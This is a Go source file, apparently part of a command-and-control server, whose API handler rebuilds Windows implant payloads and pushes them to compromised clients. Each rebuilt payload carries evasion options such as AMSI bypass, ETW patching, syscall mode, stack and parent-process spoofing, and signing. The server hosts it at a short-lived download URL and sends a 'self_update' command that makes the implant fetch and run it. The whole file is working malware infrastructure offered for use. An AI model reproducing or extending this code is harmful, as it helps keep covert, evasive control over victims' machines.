package api

import (
	"BackendTemplate/pkg/database"
	"BackendTemplate/pkg/delivery"
	"BackendTemplate/pkg/sendcommand"
	"BackendTemplate/pkg/utils/logx"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
)

// 客户端升级：为客户端重新生成一份与当前监听器/架构匹配的载荷，注册成一次性
// 投递 URL，再下发 self_update <url> 让客户端自己下载替换并重启。
//
// 适用面：**独立 EXE 载荷**。DLL/注入/迁移形态的 os.Executable() 指向宿主进程，
// self_update 会去替换宿主文件；新版客户端内置了标记校验会拒绝，但旧客户端没有。
// 因此这里还有一道服务端保守闸门（拒绝常见宿主进程名）+ 前端二次确认。
const (
	clientUpgradeMaxBatch = 10
	clientUpgradeURLTTL   = 30 * time.Minute
)

// upgradeBlockedProcesses 常见宿主进程：这些进程名下运行的多半是 DLL/注入/迁移载荷，
// 不能对它执行 self_update（会替换宿主程序文件）。命中直接拒绝并说明原因。
var upgradeBlockedProcesses = map[string]bool{
	"rundll32.exe": true, "regsvr32.exe": true, "dllhost.exe": true,
	"svchost.exe": true, "explorer.exe": true, "lsass.exe": true,
	"winlogon.exe": true, "csrss.exe": true, "smss.exe": true,
	"wininit.exe": true, "services.exe": true, "taskhostw.exe": true,
	"conhost.exe": true, "notepad.exe": true,
}

type clientUpgradeRequest struct {
	UIDs []string `json:"uids"`
	// Confirm 必须为 true：升级会替换客户端文件并重启进程，属于破坏性操作。
	Confirm bool `json:"confirm"`
	// 可选：覆盖投递 URL 的对外 Host/Scheme（默认取 delivery 配置/监听器推断）。
	PublicHost   string `json:"publicHost"`
	PublicScheme string `json:"publicScheme"`
}

type clientUpgradeResult struct {
	UID     string `json:"uid"`
	OK      bool   `json:"ok"`
	Message string `json:"message"`
	URL     string `json:"url,omitempty"`
}

// UpgradeClients 批量升级客户端（重新生成载荷 + self_update）。
func UpgradeClients(c *gin.Context) {
	var req clientUpgradeRequest
	if err := c.BindJSON(&req); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{"error": "参数解析失败: " + err.Error()})
		return
	}
	if !req.Confirm {
		c.JSON(http.StatusBadRequest, gin.H{"error": "升级会替换客户端文件并重启进程，需显式确认（confirm=true）"})
		return
	}
	uids := dedupeNonEmpty(req.UIDs)
	if len(uids) == 0 {
		c.JSON(http.StatusBadRequest, gin.H{"error": "uids 不能为空"})
		return
	}
	if len(uids) > clientUpgradeMaxBatch {
		c.JSON(http.StatusBadRequest, gin.H{"error": fmt.Sprintf("单次最多升级 %d 个客户端", clientUpgradeMaxBatch)})
		return
	}

	results := make([]clientUpgradeResult, 0, len(uids))
	succeeded := 0
	for _, uid := range uids {
		res := upgradeOneClient(uid, req)
		if res.OK {
			succeeded++
		}
		results = append(results, res)
	}

	auditLogEvent("CLIENT_UPGRADE", "SUCCESS", fmt.Sprintf("升级客户端 %d/%d", succeeded, len(results)),
		map[string]interface{}{"uids": uids, "succeeded": succeeded})

	c.JSON(http.StatusOK, gin.H{"status": 200, "data": gin.H{
		"results":   results,
		"succeeded": succeeded,
		"failed":    len(results) - succeeded,
	}})
}

func upgradeOneClient(uid string, req clientUpgradeRequest) clientUpgradeResult {
	fail := func(format string, args ...interface{}) clientUpgradeResult {
		return clientUpgradeResult{UID: uid, OK: false, Message: fmt.Sprintf(format, args...)}
	}

	client, has, err := database.Clients_().GetByUID(uid)
	if err != nil || !has {
		return fail("会话不存在")
	}
	if !strings.EqualFold(client.Os, "windows") {
		return fail("self_update 仅支持 Windows 客户端（当前 OS=%s）", client.Os)
	}
	if upgradeBlockedProcesses[strings.ToLower(strings.TrimSpace(client.Process))] {
		return fail("进程 %s 不是独立 EXE payload（DLL/注入/迁移形态），执行 self_update 会替换宿主程序文件，已拒绝", client.Process)
	}

	listenerType := client.Listener
	lis, has := listenerForClient(uid, listenerType)
	if !has {
		return fail("未找到监听器记录: %s", listenerType)
	}
	if lis.Status != 1 {
		return fail("监听器未运行: %s", listenerType)
	}
	connectAddress := resolveClientConnectAddress(lis)
	if connectAddress == "" {
		return fail("监听器连接地址为空")
	}

	arch := "amd64"
	if client.Arch == "x86" || strings.Contains(strings.ToLower(client.Arch), "386") {
		arch = "386"
	}
	binaryFileName := findBinary(listenerType, "windows", arch)
	if binaryFileName == "" {
		return fail("未找到 %s/windows/%s 模板", listenerType, arch)
	}
	binaryData, err := readTemplate(listenerType, binaryFileName)
	if err != nil {
		return fail("读取模板失败: %v", err)
	}

	ops, err := resolveOpsec(&genServerBody{}, "windows", arch)
	if err != nil {
		return fail("OPSEC 配置非法: %v", err)
	}
	beaconSleep, beaconJitter := listenerBeaconOverrides(lis)
	opts := delivery.PatchOptions{
		ListenerConfig:    listenerType + "://" + connectAddress,
		OS:                "windows",
		Arch:              arch,
		VKey:              lis.VKey,
		EncryptSalt:       lis.EncryptionSalt,
		Pass:              "", // self_update 重启不带参数；带口令的新载荷会直接退出
		QuietMode:         ops.QuietMode,
		ETWPatch:          ops.ETW,
		AmsiBypass:        ops.AMSI,
		SyscallMode:       ops.SyscallMode,
		InjectTechDefault: ops.InjectTech,
		SleepMaskHide:     ops.SleepMaskHide,
		StackSpoof:        ops.StackSpoof,
		PpidSpoof:         ops.PpidSpoof,
		BlockDLLs:         ops.BlockDLLs,
		UnhookOnStart:     ops.UnhookOnStart,
		AutoDelete:        "0", // 保留文件，便于后续再次升级
		Format:            "exe",
		HashPad:           cfgHashPad(),
		Sign:              true,
		SleepSeconds:      beaconSleep,
		JitterPercent:     beaconJitter,
	}
	applyListenerProfileRecord(&opts, lis)

	patched, err := delivery.PatchClientBinary(binaryData, opts)
	if err != nil {
		return fail("生成升级载荷失败: %v", err)
	}

	key := delivery.ShortKey()
	meta := database.WebDelivery{
		ListenerConfig: listenerType + "://" + connectAddress,
		OS:             "windows",
		Arch:           arch,
		Status:         1,
		BindMode:       "shared",
		PublicKey:      key,
		FileName:       "u_" + key + ".exe",
		MaxDownloads:   3, // 允许客户端因网络抖动重试
		PublicHost:     strings.TrimSpace(req.PublicHost),
		PublicScheme:   strings.TrimSpace(req.PublicScheme),
	}
	delivery.BuildPublicURLs(&meta, delivery.GlobalHub.MainPort())
	delivery.GlobalHub.Register(meta, delivery.Payload{Full: patched, FileName: meta.FileName})
	time.AfterFunc(clientUpgradeURLTTL, func() {
		delivery.GlobalHub.Unregister(key, "")
		logx.Infof("🧹 [UPGRADE] 升级投递 URL 已过期清理: %s\n", key)
	})

	if err := sendcommand.SendCommandChecked(uid, "self_update "+meta.ServerAddress); err != nil {
		delivery.GlobalHub.Unregister(key, "")
		return fail("下发 self_update 失败: %v", err)
	}
	logx.Infof("⬆️ [UPGRADE] uid=%s 已下发 self_update: %s\n", uid, meta.ServerAddress)
	return clientUpgradeResult{UID: uid, OK: true, Message: "升级命令已下发（2 秒后客户端替换并重启）", URL: meta.ServerAddress}
}

func dedupeNonEmpty(in []string) []string {
	seen := make(map[string]bool, len(in))
	out := make([]string, 0, len(in))
	for _, v := range in {
		v = strings.TrimSpace(v)
		if v == "" || seen[v] {
			continue
		}
		seen[v] = true
		out = append(out, v)
	}
	return out
}
